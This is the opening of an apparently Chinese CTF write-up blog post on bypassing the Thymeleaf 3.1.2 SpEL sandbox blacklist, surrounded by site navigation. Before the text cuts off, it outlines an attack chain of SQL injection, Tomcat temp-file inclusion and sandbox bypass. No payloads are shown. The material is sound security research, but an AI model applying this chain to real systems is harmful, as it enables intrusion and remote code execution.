<!doctype html><html lang=zh class=no-js> <head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="happy hunting bugs <feedId:69986037923968000+userId:56297007026754560>"><meta name=author content=wh1t3p1g><link href=https://blog.0kami.cn/blog/2024/thymeleaf%20ssti%203.1.2%20%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/ rel=canonical><link rel=prev href=../../..><link href=../../2023/%E3%80%90%E9%9A%8F%E7%AC%94%E3%80%91XML-RPC%20RCE%20CVE-2023-49070/ rel=next><link rel=alternate type=application/rss+xml title="RSS 订阅" href=../../../feed_rss_created.xml><link rel=alternate type=application/rss+xml title="已更新内容的 RSS 订阅" href=../../../feed_rss_updated.xml><link rel=icon href=../../../assets/images/favicon.png><meta name=generator content="mkdocs-1.6.1, mkdocs-material-9.6.7"><title>Thymeleaf ssti 3.1.2 黑名单绕过 - wh1t3p1g's blog</title><link rel=stylesheet href=../../../assets/stylesheets/main.8608ea7d.min.css><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link rel=stylesheet href="https://fonts.googleapis.com/css?family=Noto+Sans+Hong+Kong:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback"><style>:root{--md-text-font:"Noto Sans Hong Kong";--md-code-font:"Roboto Mono"}</style><link rel=stylesheet href=../../../stylesheets/extra.css><script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script></head> <body dir=ltr> <input class=md-toggle data-md-toggle=drawer type=checkbox id=__drawer autocomplete=off> <input class=md-toggle data-md-toggle=search type=checkbox id=__search autocomplete=off> <label class=md-overlay for=__drawer></label> <div data-md-component=skip> <a href=#0x01 class=md-skip> 跳转至 </a> </div> <div data-md-component=announce> </div> <header class=md-header data-md-component=header> <nav class="md-header__inner md-grid" aria-label=页眉> <a href=../../.. title="wh1t3p1g's blog" class="md-header__button md-logo" aria-label="wh1t3p1g's blog" data-md-component=logo> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg> </a> <label class="md-header__button md-icon" for=__drawer> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg> </label> <div class=md-header__title data-md-component=header-title> <div class=md-header__ellipsis> <div class=md-header__topic> <span class=md-ellipsis> wh1t3p1g's blog </span> </div> <div class=md-header__topic data-md-component=header-topic> <span class=md-ellipsis> Thymeleaf ssti 3.1.2 黑名单绕过 </span> </div> </div> </div> <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script> <label class="md-header__button md-icon" for=__search> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg> </label> <div class=md-search data-md-component=search role=dialog> <label class=md-search__overlay for=__search></label> <div class=md-search__inner role=search> <form class=md-search__form name=search> <input type=text class=md-search__input name=query aria-label=搜索 placeholder=搜索 autocapitalize=off autocorrect=off autocomplete=off spellcheck=false data-md-component=search-query required> <label class="md-search__icon md-icon" for=__search> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg> </label> <nav class=md-search__options aria-label=查找> <button type=reset class="md-search__icon md-icon" title=清空当前内容 aria-label=清空当前内容 tabindex=-1> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg> </button> </nav> </form> <div class=md-search__output> <div class=md-search__scrollwrap tabindex=0 data-md-scrollfix> <div class=md-search-result data-md-component=search-result> <div class=md-search-result__meta> 正在初始化搜索引擎 </div> <ol class=md-search-result__list role=presentation></ol> </div> </div> </div> </div> </div> <div class=md-header__source> <a href=https://github.com/wh1t3p1g title=前往仓库 class=md-source data-md-component=source> <div class="md-source__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 480 512"><!-- Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M186.1 328.7c0 20.9-10.9 55.1-36.7 55.1s-36.7-34.2-36.7-55.1 10.9-55.1 36.7-55.1 36.7 34.2 36.7 55.1M480 278.2c0 31.9-3.2 65.7-17.5 95-37.9 76.6-142.1 74.8-216.7 74.8-75.8 0-186.2 2.7-225.6-74.8-14.6-29-20.2-63.1-20.2-95 0-41.9 13.9-81.5 41.5-113.6-5.2-15.8-7.7-32.4-7.7-48.8 0-21.5 4.9-32.3 14.6-51.8 45.3 0 74.3 9 108.8 36 29-6.9 58.8-10 88.7-10 27 0 54.2 2.9 80.4 9.2 34-26.7 63-35.2 107.8-35.2 9.8 19.5 14.6 30.3 14.6 51.8 0 16.4-2.6 32.7-7.7 48.2 27.5 32.4 39 72.3 39 114.2m-64.3 50.5c0-43.9-26.7-82.6-73.5-82.6-18.9 0-37 3.4-56 6-14.9 2.3-29.8 3.2-45.1 3.2-15.2 0-30.1-.9-45.1-3.2-18.7-2.6-37-6-56-6-46.8 0-73.5 38.7-73.5 82.6 0 87.8 80.4 101.3 150.4 101.3h48.2c70.3 0 150.6-13.4 150.6-101.3m-82.6-55.1c-25.8 0-36.7 34.2-36.7 55.1s10.9 55.1 36.7 55.1 36.7-34.2 36.7-55.1-10.9-55.1-36.7-55.1"/></svg> </div> <div class=md-source__repository> GitHub </div> </a> </div> </nav> </header> <div class=md-container data-md-component=container> <nav class=md-tabs aria-label=标签 data-md-component=tabs> <div class=md-grid> <ul class=md-tabs__list> <li class=md-tabs__item> <a href=../../.. class=md-tabs__link> Home </a> </li> <li class="md-tabs__item md-tabs__item--active"> <a href=./ class=md-tabs__link> Blog </a> </li> <li class=md-tabs__item> <a href=../../../writeups/2020/xnuca-2020-easyjava/ class=md-tabs__link> Writeups </a> </li> <li class=md-tabs__item> <a href=../../../about/ class=md-tabs__link> About Me </a> </li> </ul> </div> </nav> <main class=md-main data-md-component=main> <div class="md-main__inner md-grid"> <div class="md-sidebar md-sidebar--primary" data-md-component=sidebar data-md-type=navigation> <div class=md-sidebar__scrollwrap> <div class=md-sidebar__inner> <nav class="md-nav md-nav--primary md-nav--lifted" aria-label=导航栏 data-md-level=0> <label class=md-nav__title for=__drawer> <a href=../../.. title="wh1t3p1g's blog" class="md-nav__button md-logo" aria-label="wh1t3p1g's blog" data-md-component=logo> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg> </a> wh1t3p1g's blog </label> <div class=md-nav__source> <a href=https://github.com/wh1t3p1g title=前往仓库 class=md-source data-md-component=source> <div class="md-source__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 480 512"><!-- Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M186.1 328.7c0 20.9-10.9 55.1-36.7 55.1s-36.7-34.2-36.7-55.1 10.9-55.1 36.7-55.1 36.7 34.2 36.7 55.1M480 278.2c0 31.9-3.2 65.7-17.5 95-37.9 76.6-142.1 74.8-216.7 74.8-75.8 0-186.2 2.7-225.6-74.8-14.6-29-20.2-63.1-20.2-95 0-41.9 13.9-81.5 41.5-113.6-5.2-15.8-7.7-32.4-7.7-48.8 0-21.5 4.9-32.3 14.6-51.8 45.3 0 74.3 9 108.8 36 29-6.9 58.8-10 88.7-10 27 0 54.2 2.9 80.4 9.2 34-26.7 63-35.2 107.8-35.2 9.8 19.5 14.6 30.3 14.6 51.8 0 16.4-2.6 32.7-7.7 48.2 27.5 32.4 39 72.3 39 114.2m-64.3 50.5c0-43.9-26.7-82.6-73.5-82.6-18.9 0-37 3.4-56 6-14.9 2.3-29.8 3.2-45.1 3.2-15.2 0-30.1-.9-45.1-3.2-18.7-2.6-37-6-56-6-46.8 0-73.5 38.7-73.5 82.6 0 87.8 80.4 101.3 150.4 101.3h48.2c70.3 0 150.6-13.4 150.6-101.3m-82.6-55.1c-25.8 0-36.7 34.2-36.7 55.1s10.9 55.1 36.7 55.1 36.7-34.2 36.7-55.1-10.9-55.1-36.7-55.1"/></svg> </div> <div class=md-source__repository> GitHub </div> </a> </div> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../.. class=md-nav__link> <span class=md-ellipsis> Home </span> </a> </li> <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle " type=checkbox id=__nav_2 checked> <label class=md-nav__link for=__nav_2 id=__nav_2_label tabindex> <span class=md-ellipsis> Blog </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav data-md-level=1 aria-labelledby=__nav_2_label aria-expanded=true> <label class=md-nav__title for=__nav_2> <span class="md-nav__icon md-icon"></span> Blog </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--active md-nav__item--nested"> <input class="md-nav__toggle md-toggle " type=checkbox id=__nav_2_1 checked> <label class=md-nav__link for=__nav_2_1 id=__nav_2_1_label tabindex=0> <span class=md-ellipsis> 2024 </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav data-md-level=2 aria-labelledby=__nav_2_1_label aria-expanded=true> <label class=md-nav__title for=__nav_2_1> <span class="md-nav__icon md-icon"></span> 2024 </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--active"> <input class="md-nav__toggle md-toggle" type=checkbox id=__toc> <label class="md-nav__link md-nav__link--active" for=__toc> <span class=md-ellipsis> Thymeleaf ssti 3.1.2 黑名单绕过 </span> <span class="md-nav__icon md-icon"></span> </label> <a href=./ class="md-nav__link md-nav__link--active"> <span class=md-ellipsis> Thymeleaf ssti 3.1.2 黑名单绕过 </span> </a> <nav class="md-nav md-nav--secondary" aria-label=目录> <label class=md-nav__title for=__toc> <span class="md-nav__icon md-icon"></span> 目录 </label> <ul class=md-nav__list data-md-component=toc data-md-scrollfix> <li class=md-nav__item> <a href=#0x01 class=md-nav__link> <span class=md-ellipsis> 0x01 前言 </span> </a> </li> <li class=md-nav__item> <a href=#0x02-chatterbox class=md-nav__link> <span class=md-ellipsis> 0x02 简述 ChatterBox 解题思路 </span> </a> </li> <li class=md-nav__item> <a href=#0x03-thymeleaf class=md-nav__link> <span class=md-ellipsis> 0x03 thymeleaf 沙盒原理 </span> </a> <nav class=md-nav aria-label="0x03 thymeleaf 沙盒原理"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_1 class=md-nav__link> <span class=md-ellipsis> 类型限制 </span> </a> </li> <li class=md-nav__item> <a href=#_2 class=md-nav__link> <span class=md-ellipsis> 函数调用限制 </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#0x04 class=md-nav__link> <span class=md-ellipsis> 0x04 如何绕过这两个限制 </span> </a> <nav class=md-nav aria-label="0x04 如何绕过这两个限制"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#cypher class=md-nav__link> <span class=md-ellipsis> 编写 Cypher 语句 </span> </a> </li> <li class=md-nav__item> <a href=#_3 class=md-nav__link> <span class=md-ellipsis> 结果确认 </span> </a> <nav class=md-nav aria-label=结果确认> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_4 class=md-nav__link> <span class=md-ellipsis> 思路一：反射构造函数 </span> </a> </li> <li class=md-nav__item> <a href=#_5 class=md-nav__link> <span class=md-ellipsis> 思路二：反射函数调用 </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#0x05 class=md-nav__link> <span class=md-ellipsis> 0x05 总结 </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle " type=checkbox id=__nav_2_2> <label class=md-nav__link for=__nav_2_2 id=__nav_2_2_label tabindex=0> <span class=md-ellipsis> 2023 </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav data-md-level=2 aria-labelledby=__nav_2_2_label aria-expanded=false> <label class=md-nav__title for=__nav_2_2> <span class="md-nav__icon md-icon"></span> 2023 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../2023/%E3%80%90%E9%9A%8F%E7%AC%94%E3%80%91XML-RPC%20RCE%20CVE-2023-49070/ class=md-nav__link> <span class=md-ellipsis> 【tabby 案例随笔】XML-RPC RCE CVE-2023-49070 </span> </a> </li> <li class=md-nav__item> <a href=../../2023/%E3%80%90%E9%9A%8F%E7%AC%94%E3%80%91sysaid%20CVE-2023-47246/ class=md-nav__link> <span class=md-ellipsis> 【tabby 案例随笔】sysaid CVE-2023-47246 </span> </a> </li> <li class=md-nav__item> <a href=../../2023/%E5%9F%BA%E4%BA%8E%E4%BB%A3%E7%A0%81%E5%B1%9E%E6%80%A7%E5%9B%BE%E7%9A%84%E8%87%AA%E5%8A%A8%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%AE%9E%E8%B7%B5/ class=md-nav__link> <span class=md-ellipsis> 基于代码属性图的自动化漏洞挖掘实践 </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle " type=checkbox id=__nav_2_3> <label class=md-nav__link for=__nav_2_3 id=__nav_2_3_label tabindex=0> <span class=md-ellipsis> 2021 </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav data-md-level=2 aria-labelledby=__nav_2_3_label aria-expanded=false> <label class=md-nav__title for=__nav_2_3> <span class="md-nav__icon md-icon"></span> 2021 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../2021/how_to_find_gadget_chains/ class=md-nav__link> <span class=md-ellipsis> 如何高效的挖掘Java反序列化利用链？ </span> </a> </li> <li class=md-nav__item> <a href=../../2021/how_to_find_gadget_chains_2/ class=md-nav__link> <span class=md-ellipsis> 如何高效地捡漏反序列化利用链？ </span> </a> </li> <li class=md-nav__item> <a href=../../2021/xstream_blacklist_bypass/ class=md-nav__link> <span class=md-ellipsis> XStream 1.4.15 Blacklist Bypass </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle " type=checkbox id=__nav_2_4> <label class=md-nav__link for=__nav_2_4 id=__nav_2_4_label tabindex=0> <span class=md-ellipsis> 2020 </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav data-md-level=2 aria-labelledby=__nav_2_4_label aria-expanded=false> <label class=md-nav__title for=__nav_2_4> <span class="md-nav__icon md-icon"></span> 2020 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../2020/java-jmx-rmi-20200310/ class=md-nav__link> <span class=md-ellipsis> 攻击Java JMX-RMI </span> </a> </li> <li class=md-nav__item> <a href=../../2020/jndi-with-ldap-20200301/ class=md-nav__link> <span class=md-ellipsis> JNDI with LDAP </span> </a> </li> <li class=md-nav__item> <a href=../../2020/jndi-with-rmi-20200209/ class=md-nav__link> <span class=md-ellipsis> JNDI with RMI </span> </a> </li> <li class=md-nav__item> <a href=../../2020/rmi-registry-security-problem-20200206/ class=md-nav__link> <span class=md-ellipsis> 浅谈Java RMI Registry安全问题 </span> </a> </li> <li class=md-nav__item> <a href=../../2020/talk-about-fastjson-deserialization-20200413/ class=md-nav__link> <span class=md-ellipsis> 浅谈fastjson反序列化漏洞 </span> </a> </li> <li class=md-nav__item> <a href=../../2020/talk-about-xstream-deserialization-20200418/ class=md-nav__link> <span class=md-ellipsis> 回顾XStream反序列化漏洞 </span> </a> </li> <li class=md-nav__item> <a href=../../2020/talk_about_struts2/ class=md-nav__link> <span class=md-ellipsis> struts2历史漏洞分析 </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle " type=checkbox id=__nav_2_5> <label class=md-nav__link for=__nav_2_5 id=__nav_2_5_label tabindex=0> <span class=md-ellipsis> 2019 </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav data-md-level=2 aria-labelledby=__nav_2_5_label aria-expanded=false> <label class=md-nav__title for=__nav_2_5> <span class="md-nav__icon md-icon"></span> 2019 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../2019/mycncart-v2-0-0-3-sqli-20190225/ class=md-nav__link> <span class=md-ellipsis> mycncart sqli </span> </a> </li> <li class=md-nav__item> <a href=../../2019/study-java-deserialized-commonscollections3-1-20191024/ class=md-nav__link> <span class=md-ellipsis> Java反序列化利用链挖掘之CommonsCollections1 </span> </a> </li> <li class=md-nav__item> <a href=../../2019/study-java-deserialized-commonscollections3-3-20191028/ class=md-nav__link> <span class=md-ellipsis> Java反序列化利用链挖掘之CommonsCollections3 </span> </a> </li> <li class=md-nav__item> <a href=../../2019/study-java-deserialized-commonscollections3-others-20191031/ class=md-nav__link> <span class=md-ellipsis> Java反序列化利用链挖掘之CommonsCollections5,6,7,9,10 </span> </a> </li> <li class=md-nav__item> <a href=../../2019/study-java-deserialized-commonscollections4-20191105/ class=md-nav__link> <span class=md-ellipsis> Java反序列化利用链挖掘之CommonsCollections2,4,8 </span> </a> </li> <li class=md-nav__item> <a href=../../2019/study-java-deserialized-shiro-1-2-4-20191110/ class=md-nav__link> <span class=md-ellipsis> Java反序列化利用链挖掘之Shiro反序列化 </span> </a> </li> <li class=md-nav__item> <a href=../../2019/temmoku-t1-15-sqli-20190221/ class=md-nav__link> <span class=md-ellipsis> temmoku home版 t1.15 前台sqli </span> </a> </li> <li class=md-nav__item> <a href=../../2019/thinkphp-v5.x-App.php-rce/ class=md-nav__link> <span class=md-ellipsis> thinkphp v5.x App.php s参数RCE </span> </a> </li> <li class=md-nav__item> <a href=../../2019/thinkphp_5.2.x_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/ class=md-nav__link> <span class=md-ellipsis> thinkphp v5.2.x 反序列化利用链挖掘 </span> </a> </li> <li class=md-nav__item> <a href=../../2019/thinkphp_6.0.x_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/ class=md-nav__link> <span class=md-ellipsis> thinkphp v6.0.x 反序列化利用链挖掘 </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle " type=checkbox id=__nav_2_6> <label class=md-nav__link for=__nav_2_6 id=__nav_2_6_label tabindex=0> <span class=md-ellipsis> 2018 </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav data-md-level=2 aria-labelledby=__nav_2_6_label aria-expanded=false> <label class=md-nav__title for=__nav_2_6> <span class="md-nav__icon md-icon"></span> 2018 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../2018/MovieGuide2SQLi-20180203/ class=md-nav__link> <span class=md-ellipsis> MovieGuide v2.0 SQLi </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle " type=checkbox id=__nav_2_7> <label class=md-nav__link for=__nav_2_7 id=__nav_2_7_label tabindex=0> <span class=md-ellipsis> 2017 </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav data-md-level=2 aria-labelledby=__nav_2_7_label aria-expanded=false> <label class=md-nav__title for=__nav_2_7> <span class="md-nav__icon md-icon"></span> 2017 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../2017/bluecms-v1-6-Sql-Injection/ class=md-nav__link> <span class=md-ellipsis> bluecms v1.6 Sql Injection 分析 </span> </a> </li> <li class=md-nav__item> <a href=../../2017/old-DM-sql-injection/ class=md-nav__link> <span class=md-ellipsis> DM企业建站系统前台盲注 </span> </a> </li> <li class=md-nav__item> <a href=../../2017/old-seacms-v6-5-getshell/ class=md-nav__link> <span class=md-ellipsis> seacms v6.5 前台getshell </span> </a> </li> <li class=md-nav__item> <a href=../../2017/struts2-history-payload/ class=md-nav__link> <span class=md-ellipsis> Struts2命令执行各版本记录 </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle " type=checkbox id=__nav_2_8> <label class=md-nav__link for=__nav_2_8 id=__nav_2_8_label tabindex=0> <span class=md-ellipsis> 2016 </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav data-md-level=2 aria-labelledby=__nav_2_8_label aria-expanded=false> <label class=md-nav__title for=__nav_2_8> <span class="md-nav__icon md-icon"></span> 2016 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../2016/old-cve-2016-6663-mysql-exp/ class=md-nav__link> <span class=md-ellipsis> MYSQL提权分析 </span> </a> </li> <li class=md-nav__item> <a href=../../2016/old-dirtycow-cve-2016-5195/ class=md-nav__link> <span class=md-ellipsis> CVE-2016-5195 Dirtycow </span> </a> </li> <li class=md-nav__item> <a href=../../2016/old-wordpress-ssrf-4-4-2/ class=md-nav__link> <span class=md-ellipsis> wordpress SSRF <4.5 </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle " type=checkbox id=__nav_3> <label class=md-nav__link for=__nav_3 id=__nav_3_label tabindex=0> <span class=md-ellipsis> Writeups </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav data-md-level=1 aria-labelledby=__nav_3_label aria-expanded=false> <label class=md-nav__title for=__nav_3> <span class="md-nav__icon md-icon"></span> Writeups </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle " type=checkbox id=__nav_3_1> <label class=md-nav__link for=__nav_3_1 id=__nav_3_1_label tabindex=0> <span class=md-ellipsis> 2020 </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav data-md-level=2 aria-labelledby=__nav_3_1_label aria-expanded=false> <label class=md-nav__title for=__nav_3_1> <span class="md-nav__icon md-icon"></span> 2020 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../writeups/2020/xnuca-2020-easyjava/ class=md-nav__link> <span class=md-ellipsis> xnuca2020 easyjava设计思路 </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle " type=checkbox id=__nav_3_2> <label class=md-nav__link for=__nav_3_2 id=__nav_3_2_label tabindex=0> <span class=md-ellipsis> 2018 </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav data-md-level=2 aria-labelledby=__nav_3_2_label aria-expanded=false> <label class=md-nav__title for=__nav_3_2> <span class="md-nav__icon md-icon"></span> 2018 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../writeups/2018/ddctf-web-writeup-20180421/ class=md-nav__link> <span class=md-ellipsis> DDCTF 2018 web writeup </span> </a> </li> <li class=md-nav__item> <a href=../../../writeups/2018/hitb-xctf-2018-portion-web-writeup-20180415/ class=md-nav__link> <span class=md-ellipsis> HITB-XCTF 2018 web writeup </span> </a> </li> <li class=md-nav__item> <a href=../../../writeups/2018/old-python-sandbox-escape/ class=md-nav__link> <span class=md-ellipsis> python sandbox escape </span> </a> </li> <li class=md-nav__item> <a href=../../../writeups/2018/suctf-part-web-writeup-20180528/ class=md-nav__link> <span class=md-ellipsis> SUCTF 2018 部分web writeup </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../../../about/ class=md-nav__link> <span class=md-ellipsis> About Me </span> </a> </li> </ul> </nav> </div> </div> </div> <div class="md-sidebar md-sidebar--secondary" data-md-component=sidebar data-md-type=toc> <div class=md-sidebar__scrollwrap> <div class=md-sidebar__inner> <nav class="md-nav md-nav--secondary" aria-label=目录> <label class=md-nav__title for=__toc> <span class="md-nav__icon md-icon"></span> 目录 </label> <ul class=md-nav__list data-md-component=toc data-md-scrollfix> <li class=md-nav__item> <a href=#0x01 class=md-nav__link> <span class=md-ellipsis> 0x01 前言 </span> </a> </li> <li class=md-nav__item> <a href=#0x02-chatterbox class=md-nav__link> <span class=md-ellipsis> 0x02 简述 ChatterBox 解题思路 </span> </a> </li> <li class=md-nav__item> <a href=#0x03-thymeleaf class=md-nav__link> <span class=md-ellipsis> 0x03 thymeleaf 沙盒原理 </span> </a> <nav class=md-nav aria-label="0x03 thymeleaf 沙盒原理"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_1 class=md-nav__link> <span class=md-ellipsis> 类型限制 </span> </a> </li> <li class=md-nav__item> <a href=#_2 class=md-nav__link> <span class=md-ellipsis> 函数调用限制 </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#0x04 class=md-nav__link> <span class=md-ellipsis> 0x04 如何绕过这两个限制 </span> </a> <nav class=md-nav aria-label="0x04 如何绕过这两个限制"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#cypher class=md-nav__link> <span class=md-ellipsis> 编写 Cypher 语句 </span> </a> </li> <li class=md-nav__item> <a href=#_3 class=md-nav__link> <span class=md-ellipsis> 结果确认 </span> </a> <nav class=md-nav aria-label=结果确认> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_4 class=md-nav__link> <span class=md-ellipsis> 思路一：反射构造函数 </span> </a> </li> <li class=md-nav__item> <a href=#_5 class=md-nav__link> <span class=md-ellipsis> 思路二：反射函数调用 </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#0x05 class=md-nav__link> <span class=md-ellipsis> 0x05 总结 </span> </a> </li> </ul> </nav> </div> </div> </div> <div class=md-content data-md-component=content> <article class="md-content__inner md-typeset"> <nav class=md-tags> <a href=../../../.#tag:java class=md-tag>Java</a> <a href=../../../.#tag:ctf class=md-tag>ctf</a> </nav> <h1>Thymeleaf ssti 3.1.2 黑名单绕过</h1> <h2 id=0x01>0x01 前言</h2> <ul> <li>thymeleaf 模版对于 SpEL 表达式的解析具有黑名单上的类型检查（最早追溯到什么时间暂时没找到）</li> <li>在 2023.07 thymeleaf 出了个沙箱绕过的漏洞 CVE-2023-38286，影响版本是 3.1.1.RELEASE。这个沙盒绕过可以追溯到 <a href=https://github.com/advisories/GHSA-7gj7-224w-vpr3>spring admin 的模版解析漏洞</a> 。主要出在 <code>org.springframework.util</code>下的反射包可以绕过上述的类型检查黑名单。thymeleaf 修复的 <a href=https://github.com/thymeleaf/thymeleaf/commit/87b512d1ad331b8844f6bda404db0a36a44d19cd>commit</a> 主要是增加了黑名单内容<code>org.springframework.util</code>。</li> </ul> <p>那么，在最新的黑名单条件下，还能绕过 3.1.2 的沙盒吗？答案是肯定的，黑名单措施永远仅为一个无奈之举。也预想到 thymeleaf 的 cve 也有的卷了 XD。 本文将以 rwctf2024 的 chatterbox 为例，简单讲述下怎么绕过 3.1.2 的黑名单。</p> <h2 id=0x02-chatterbox>0x02 简述 ChatterBox 解题思路</h2> <p>ChatterBox 这道题我们的揭发主要有以下几个部分</p> <ol> <li>pgsql sql 注入</li> <li><a href=https://tttang.com/archive/1692/#toc__4>tomcat 临时文件包含</a></li> <li>thymeleaf 沙盒绕过</li> </ol> <p>这里 1 和 2 不是重点，不细讲了。思路主要是</p> <ol> <li>利用 pgsql 报错注入盲注出 admin 